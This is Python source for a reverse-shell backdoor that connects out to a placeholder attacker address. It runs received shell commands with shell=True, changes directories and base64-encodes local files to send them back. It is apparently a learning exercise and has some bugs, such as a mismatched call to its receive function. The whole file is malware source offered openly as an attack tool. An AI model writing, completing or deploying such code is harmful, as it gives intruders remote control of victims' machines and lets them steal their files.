#!/usr/bin/python
# General - Using json to manage serialisation to send large data.
# General - It's able to connect and, receive and send data.


import socket
import json
import subprocess
import base64
import os

class Bdoor:
    def __init__(self, addr, prt):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((addr, prt))

    def send_data(self, data):
        json_data = json.dumps(data)
        # After transforming to json formant it is necessary to become tha data to binary
        # That's why encode() is used.
        self.conn.send(json_data.encode())

    def rcve_data(self):
        json_data = ""
        while True:
            try:  
                json_data += self.conn.recv(1024).decode()
                if json_data.decode() == "" or json_data == b'':
                    break
 #               print("\njson_data type: " + str(type(json_data)) + " - json_data: " + json_data) #testing
 #               print("\njson_data loads: " + json.loads(json_data) + " - loads type: " + str(type(json.loads(json_data))) + "\n") #testing
                return json.loads(json_data)
            except ValueError:
                continue

    def cd_to(self, path):
        os.chdir(path)

    def exec_cmd(self, comm):
        print(comm)
        output_ = subprocess.run(comm, capture_output=True, shell=True)
        print("\noutput type: " + str(type(output_)) + " - stdout: " + str(output_.stdout.decode()=="") + "\n") #testing
        print("\noutput type: " + str(type(output_)) + " - stderr: " + str(output_.stderr.decode()=="") + "\n") #testing
        self.send_data(output_.stdout.decode() if output_.stderr.decode() == "" else output_.stderr.decode())

    def read_f(self, path):
        # only r read plain text, with b reads binary. e.g.: open(path, "rb")
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()

    def run(self):
        while True:
            comm = self.rcve_data(1024)
            try:
                if comm == None:
                    self.exec_cmd("")
                elif "exit" in comm[0]:
                    self.con_close()
                elif comm[0] == "cd" and len(comm) > 1 and not comm[1] == "/?":
                    self.cd_to(comm[1])
                    self.exec_cmd("cd")
                elif comm[0] == "download":
                    self.send_data(self.read_f(comm[1]))
                else:
                    self.exec_cmd(comm)
            except (BrokenPipeError, ConnectionAbortedError) as cnerr:
                print(cnerr.strerror)
                self.con_close()
            except OSError as ose:
                self.send_data('[Bad command]: ' + ose.strerror)
    
    def con_close(self):
        self.conn.close()
        exit()

my_bd = Bdoor("<ip>", <prt>)
my_bd.run()